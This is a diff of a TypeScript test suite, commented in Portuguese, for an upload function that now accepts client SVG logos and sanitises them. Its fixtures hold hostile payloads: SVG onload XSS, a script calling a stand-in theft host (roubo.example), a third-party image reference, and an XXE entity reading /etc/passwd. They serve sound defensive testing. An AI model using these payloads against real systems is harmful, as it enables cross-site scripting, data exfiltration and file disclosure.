@@ -61,11 +61,13 @@ describe("o cliente finalmente consegue mandar arquivo", () => {
 });
 
 describe("as travas que impedem o volume de derrubar o banco", () => {
-  it("SVG de UPLOAD é recusado — servido do nosso domínio, ele vira XSS", async () => {
-    // A regra afrouxou em 02/08/2026 só para o que a CASA gera (logo vetorial).
-    // O que chega de fora continua recusado na porta.
+  it("arquivo que MENTE o tipo é recusado — diz SVG e não é SVG", async () => {
+    // `base.bytes` é texto comum. Se o MIME diz SVG e o conteúdo não tem raiz
+    // <svg>, o tipo está mentindo e nada garante o resto do arquivo.
     const r = await guardarArquivo({ ...base, mimeType: "image/svg+xml", kind: "inbound" });
     expect(r.ok).toBe(false);
+    if (r.ok) return;
+    expect(r.erro).toBe("svg_invalido");
   });
 
   it("tipo desconhecido é recusado na porta, não sanitizado depois", async () => {
@@ -105,32 +107,104 @@ describe("o erro é escrito para a dona do salão, não para um programador", ()
   });
 });
 
-describe("SVG é a única exceção — e o que a torna segura é como SERVIMOS", () => {
-  it("SVG que a casa gera é aceito — logo sem vetor não é logo", async () => {
+describe("SVG do cliente ENTRA — e entra limpo", () => {
+  // 09/08/2026: o CityJobs mandou os seis logos da marca em SVG e a agência
+  // recusou todos. Recusar o melhor formato de logo que existe custava mais que
+  // o risco que evitava. A porta abriu; a limpeza é o que a mantém segura.
+  const logoDoCliente = (miolo: string) =>
+    Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">${miolo}</svg>`);
+
+  const bytesGravados = () => (fs.writeFile.mock.calls[0]![1] as Buffer).toString("utf8");
+
+  it("o logo do cliente é ACEITO — era o material que faltava", async () => {
     const r = await guardarArquivo({
-      bytes: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>'),
-      fileName: "logo.svg", mimeType: "image/svg+xml",
-      workspaceId: "ws1", kind: "deliverable",
+      bytes: logoDoCliente('<path d="M10 10h80v80H10z"/>'),
+      fileName: "05_city_jobs_retangular_principal.svg",
+      mimeType: "image/svg+xml", workspaceId: "ws1", kind: "inbound",
     });
-    expect(r.ok).toBe(true);
+    expect(r.ok, "recusar o logo vetorial do cliente foi o defeito de 09/08").toBe(true);
+    expect(bytesGravados()).toContain("<path");
   });
 
-  it("SVG enviado DE FORA é recusado na porta — vem de máquina que não controlamos", async () => {
+  it("aceita, mas o onload NÃO chega ao disco", async () => {
     const r = await guardarArquivo({
-      bytes: Buffer.from('<svg onload="alert(1)"></svg>'),
-      fileName: "malicioso.svg", mimeType: "image/svg+xml",
-      workspaceId: "ws1", kind: "inbound",
+      bytes: logoDoCliente('<circle cx="50" cy="50" r="40" onload="alert(1)"/>'),
+      fileName: "logo.svg", mimeType: "image/svg+xml", workspaceId: "ws1", kind: "inbound",
     });
-    expect(r.ok).toBe(false);
-    if (!r.ok) expect(r.motivo).toMatch(/SVG/);
+    expect(r.ok).toBe(true);
+    const gravado = bytesGravados();
+    expect(gravado, "o manipulador de evento tinha que sair").not.toContain("onload");
+    expect(gravado, "o desenho tinha que ficar").toContain("<circle");
+  });
+
+  it("o <script> some e o desenho fica", async () => {
+    await guardarArquivo({
+      bytes: logoDoCliente('<script>fetch("https://roubo.example")</script><path d="M0 0"/>'),
+      fileName: "logo.svg", mimeType: "image/svg+xml", workspaceId: "ws1", kind: "inbound",
+    });
+    const gravado = bytesGravados();
+    expect(gravado).not.toContain("<script");
+    expect(gravado).not.toContain("roubo.example");
+    expect(gravado).toContain("<path");
+  });
+
+  it("referência a servidor de terceiro sai, mas o xmlns FICA", async () => {
+    // O xmlns é `http://www.w3.org/2000/svg` e não pode ser confundido com
+    // busca de recurso: sem ele o arquivo deixa de ser um SVG válido.
+    await guardarArquivo({
+      bytes: logoDoCliente('<image href="https://terceiro.example/pixel.png"/>'),
+      fileName: "logo.svg", mimeType: "image/svg+xml", workspaceId: "ws1", kind: "inbound",
+    });
+    const gravado = bytesGravados();
+    expect(gravado).not.toContain("terceiro.example");
+    expect(gravado, "sem xmlns não é SVG").toContain('xmlns="http://www.w3.org/2000/svg"');
+  });
+
+  it("DOCTYPE com entidade não passa — é por onde vem XXE", async () => {
+    await guardarArquivo({
+      bytes: Buffer.from(
+        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
+      ),
+      fileName: "logo.svg", mimeType: "image/svg+xml", workspaceId: "ws1", kind: "inbound",
+    });
+    const gravado = bytesGravados();
+    expect(gravado).not.toContain("DOCTYPE");
+    expect(gravado).not.toContain("etc/passwd");
+  });
+
+  it("o que a CASA gera não passa pela limpeza — nós o produzimos", async () => {
+    const nosso = '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://cdn.interno/x.png"/></svg>';
+    await guardarArquivo({
+      bytes: Buffer.from(nosso), fileName: "logo.svg",
+      mimeType: "image/svg+xml", workspaceId: "ws1", kind: "deliverable",
+    });
+    expect(bytesGravados()).toBe(nosso);
+  });
+
+  it("o hash e o tamanho são do arquivo LIMPO, não do que chegou", async () => {
+    // Se o sha256 fosse do original, o reenvio do mesmo arquivo não bateria com
+    // o registro guardado e duplicaria bytes no volume — e o tamanho anotado no
+    // banco não seria o do byte em disco, quebrando a conta da cota.
+    const sujo = logoDoCliente('<path d="M0 0" onload="alert(1)"/>');
+    await guardarArquivo({
+      bytes: sujo, fileName: "logo.svg",
+      mimeType: "image/svg+xml", workspaceId: "ws1", kind: "inbound",
+    });
+    const gravado = fs.writeFile.mock.calls[0]![1] as Buffer;
+    const anotado = db.mediaAsset.create.mock.calls[0]![0].data as { sizeBytes: number };
+    expect(anotado.sizeBytes).toBe(gravado.length);
+    expect(anotado.sizeBytes, "o limpo é menor que o sujo").toBeLessThan(sujo.length);
   });
 });
 
-describe("a permissão de SVG é default-deny", () => {
-  it("sem kind informado, SVG é recusado — o esquecimento não pode abrir a porta", async () => {
-    const r = await guardarArquivo({
-      bytes: Buffer.from("<svg/>"), fileName: "x.svg", mimeType: "image/svg+xml", workspaceId: "ws1",
+describe("sem kind informado, o SVG de fora é tratado como de fora", () => {
+  it("o esquecimento do campo faz o arquivo ser LIMPO, nunca confiado", async () => {
+    // Antes, esquecer o `kind` recusava o arquivo. Agora ele entra — então o
+    // esquecimento precisa cair no caminho MAIS seguro, não no mais permissivo.
+    await guardarArquivo({
+      bytes: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'),
+      fileName: "x.svg", mimeType: "image/svg+xml", workspaceId: "ws1",
     });
-    expect(r.ok).toBe(false);
+    expect((fs.writeFile.mock.calls[0]![1] as Buffer).toString("utf8")).not.toContain("onload");
   });
 });
